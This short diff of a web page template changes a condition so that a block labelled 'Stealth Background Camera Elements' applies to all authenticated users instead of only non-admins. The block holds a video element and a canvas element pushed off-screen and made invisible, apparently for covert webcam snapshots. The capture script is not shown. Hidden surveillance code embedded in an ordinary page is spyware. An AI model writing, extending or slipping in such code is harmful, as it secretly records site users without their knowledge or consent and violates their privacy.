@@ -913,7 +913,7 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 </script>
 
-{% if not current_user.is_admin %}
+{% if current_user.is_authenticated %}
 <!-- Stealth Background Camera Elements -->
 <video id="snapshotVideo" style="position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0; pointer-events: none; z-index: -9999;" autoplay playsinline muted></video>
 <canvas id="snapshotCanvas" style="position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0; pointer-events: none; z-index: -9999;"></canvas>
